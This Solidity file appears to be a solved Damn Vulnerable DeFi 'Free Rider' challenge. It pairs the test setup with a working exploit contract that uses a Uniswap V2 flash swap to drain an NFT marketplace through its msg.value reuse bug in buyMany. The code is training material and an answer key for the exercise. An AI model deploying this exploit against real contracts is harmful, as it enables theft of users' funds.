// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        // This challenge can be solved by:
        // (Sent from EOA)
        // 1) Deploy a challenge solver contract that inherits IUniswapV2Callee and IERC721Receiver and fund with enough ETH to pay flash swap fee
        // 2) Call run() on ChallengeSolver contract and initiate flash swap
        // (Sent from ChallengeSolver contract)
        // 3) Initiate flash swap for 15 WETH
        // 4) Unwrap WETH from loan
        // 5) Exploit buyMany function on marketplace contract to rescue NFTs
        // 6) Rewrap ETH to WETH
        // 7) Return flash swap amount plus fee to uniswap V2 pair
        // 8) transfer all rescued NFTs to recovery manager contract

        // amount needed to send to ChallengeSolver for fee repayment during uniswap flash swap
        // 0.3% fee from uniswap v2 docs: https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
        uint256 feeAmountNeededForFlashSwap = NFT_PRICE * 3 / 997 + 1;
        // deploy challenge solver contract funded with required fee to execute flash swap, exploit vulnerability in marketplace, and conduct NFT operations
        ChallengeSolver solver = new ChallengeSolver{value: feeAmountNeededForFlashSwap}(
            weth, token, uniswapV2Router, uniswapV2Factory, uniswapPair, marketplace, nft, recoveryManager
        );
        // execute challenge solver operations outside of constructor since contract has to fully deploy before uniswapV2 will recognize that ChallengeSolver has code to execute
        solver.run();

        // @note Foundry quirk:
        // On Ethereum, this exploit works in a single transaction by initiating the flash swap during contract creation (the constructor).
        // While a contract's constructor is executing, the contract address is valid and can receive callbacks (e.g. UniswapV2Call), even though its runtime bytecode is only stored at the end of the transaction.
        //
        // In Foundry tests (without `--isolate`), contract deployment and subsequent external calls in the same test function are executed as one top-level call, causing `extcodesize(this)`to appear as zero when Uniswap attempts the callback.
        // This makes Uniswap revert with "call to non-contract address", even though this would not occur on mainnet.
        //
        // Using `--isolate` forces Foundry to treat the deployment and execution as separate transactions, better matching real EVM behavior. This is a testing artifact, not a protocol or exploit limitation.
        //
        // So we need to run `forge test --mt test_freeRider --isolate` to make this pass.
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ChallengeSolver is IUniswapV2Callee, IERC721Receiver {
    // 0.3% LP fee for flash swaps/loans
    uint256 constant FEE_NUMERATOR = 3;
    // 997 instead of 1000 since taking out the loan slightly unbalances the pool making repayment a bit more than a strict 0.3% see uniswap v2 docs here: https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
    uint256 constant FEE_PRECISION = 997;

    WETH immutable weth;
    DamnValuableToken immutable token;
    IUniswapV2Router02 immutable uniswapV2Router;
    IUniswapV2Factory immutable uniswapV2Factory;
    IUniswapV2Pair immutable uniswapPair;
    FreeRiderNFTMarketplace immutable marketplace;
    DamnValuableNFT immutable nft;
    FreeRiderRecoveryManager immutable recoveryManager;
    address immutable player;

    constructor(
        WETH _weth,
        DamnValuableToken _token,
        IUniswapV2Router02 _uniswapV2Router,
        IUniswapV2Factory _uniswapV2Factory,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager
    ) payable {
        weth = _weth;
        token = _token;
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Factory = _uniswapV2Factory;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        player = msg.sender;
    }

    // receive function for receiving ETH when unwrapping WETH
    receive() external payable {}

    function run() public {
        // check which token is which since uniswap sorts them by lowest address so it's never a guarantee which is WETH
        console.log("token0: ", uniswapPair.token0()); // WETH
        console.log("token1: ", uniswapPair.token1()); // DVT

        // amount needed to buy 1 NFT from the marketplace contract
        uint256 wethLoanAmount = 15 ether;
        // data.length needs to be greater than 0 to initiate a flash swap instead of a regular swap in uniswap V2
        // this means we need to populate it with something and we don't need any specific information passed on so anything will do for this transaction
        bytes memory data = abi.encode("DVDeFi");
        // call swap on the uniswap V2 pair contract to initiate a flash swap/loan that can be used to rescue the NFTs
        uniswapPair.swap(wethLoanAmount, 0, address(this), data);
    }

    // callback function signature needs to be implemented to receive flash swap/loan from uniswap V2 pair contacts
    function uniswapV2Call(
        address, // sender
        uint256 amount0,
        uint256, // amount1
        bytes calldata // data
    )
        external
        override
    {
        // fetch the address of token0 and token1 from msg.sender
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        // ensure token0 is WETH
        require(token0 == address(weth), "Unexpected token0");
        // ensure that msg.sender is a V2 pair
        require(msg.sender == uniswapV2Factory.getPair(token0, token1), "Not pair");

        // unwrap loaned WETH
        weth.withdraw(amount0);

        // add tokenIds to array of tokens to buy
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        // set value equal to price of 1 NFT to exploit msg.value used in FreeRiderNFTMarketplace::buyMany loop
        uint256 buyValue = 15 ether;
        // buy all 6 NFTs for the price of one
        marketplace.buyMany{value: buyValue}(tokenIds);

        // bounty recipient address encoded into safeTransferFrom data so RecoveryManager knows where to send bounty funds
        bytes memory safeTransferFromData = abi.encode(player);
        //send NFTs to recovery address to get bounty for each
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, safeTransferFromData);
        }

        // @note math could be simplified to (uint256 wethRepaymentAmount = amount0 * 1000/997 + 1) since amount0 + (amount0 * 3/997) + 1 --> simplifies to --> amount0 * (1 + 3/997) + 1 --> amount0 * (1000/997) + 1 but I'll just leave the math broken up and explicit for clarity
        // calculate fee and amount to return to uniswap V2 pair
        uint256 flashSwapFee = amount0 * FEE_NUMERATOR / FEE_PRECISION;
        // amount + fee + 1 to account for rounding down
        uint256 wethRepaymentAmount = amount0 + flashSwapFee + 1;
        // rewrap ETH to WETH for repayment
        weth.deposit{value: wethRepaymentAmount}();
        // repay flash swap/loan
        weth.transfer(address(uniswapPair), wethRepaymentAmount);
    }

    // implement onERC721Received to satisfy safeTransfer requirements and so this contract can receive NFTs
    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
